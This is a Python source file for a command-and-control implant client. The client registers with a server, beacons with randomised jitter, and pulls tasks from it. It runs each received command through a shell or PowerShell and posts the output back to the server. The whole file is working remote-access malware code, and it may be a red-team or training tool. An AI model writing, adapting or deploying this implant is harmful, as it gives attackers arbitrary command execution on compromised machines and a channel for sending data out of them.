import requests
import socket
import time
import subprocess
import platform
import random

class Client:

    def __init__(self,server_ip, port=80,callback_interval=120,jitter=5,debug=False,https=False):
        self.server_ip = server_ip
        self.port = port
        self.callback_interval = callback_interval
        self.jitter = jitter
        self.debug = debug
        if https:
            self.protocol = "https://"
        else:
            self.protocol = "http://"
        if platform.system() == "Linux":
            self.local_ip = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True).stdout.strip()
        else:
            self.local_ip = socket.gethostbyname(socket.gethostname())
        self.os = platform.system()
        self.implant_type = "Python"

    def register(self):
        data = {'agent_id': self.local_ip,"os": self.os, "implant_type": self.implant_type}
        req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/register", json=data, timeout=10)
        if req.status_code not in [200, 201]:
            raise ValueError("Failed to register")

    def handle_task(self,task_json):
        try:
            task = task_json.get('action')
            task_id = task_json.get('task_id')
            if self.debug:
                print("Executing task:",task)
            if task == "command":
                command = task_json.get('input')
                if platform.system() == "Windows":
                    ps = subprocess.run("powershell -c " + command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                else:
                    ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
                if self.debug:
                    print("Sending result back to server:",data)
                req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
            else:
                raise ValueError("Invalid task type")
        except subprocess.CalledProcessError as e:
                data = {'agent_id':self.local_ip,'task_id': task_id, 'result': e.stderr,'returncode': e.returncode}
                req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/results", json=data)
        except Exception as e:
            pass

    def sleep(self):
        min_sleep = self.callback_interval - self.jitter
        if min_sleep <= 0:
            min_sleep = 1
        max_sleep = self.callback_interval + self.jitter
        time.sleep(random.randint(min_sleep,max_sleep))

    def run(self):
        while True:
            try:
                self.register()
                if self.debug:
                    print("Registration successful")
                break #Registration successful, move on to task retrieval
            except:
                if self.debug:
                    print("Registration failed")
                #Registration failed, retrying
                self.sleep()
        while True:
            try:
                req = requests.post(f"{self.protocol}{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=10)
                if req.status_code == 418:
                    self.register()
                    continue
                if req.status_code not in [200, 201, 204]:
                    self.sleep()
                    continue
                elif req.status_code == 204:
                    if self.debug:
                        print("No tasks")
                    self.sleep()
                    continue
                tasks = req.json()
                self.handle_task(tasks)
            except Exception as e:
                self.sleep()
                continue
                if self.debug:
                    print(e)

def main():
    client = Client("127.0.0.1",callback_interval=15,jitter=7)
    client.run()

if __name__ == '__main__':
    main()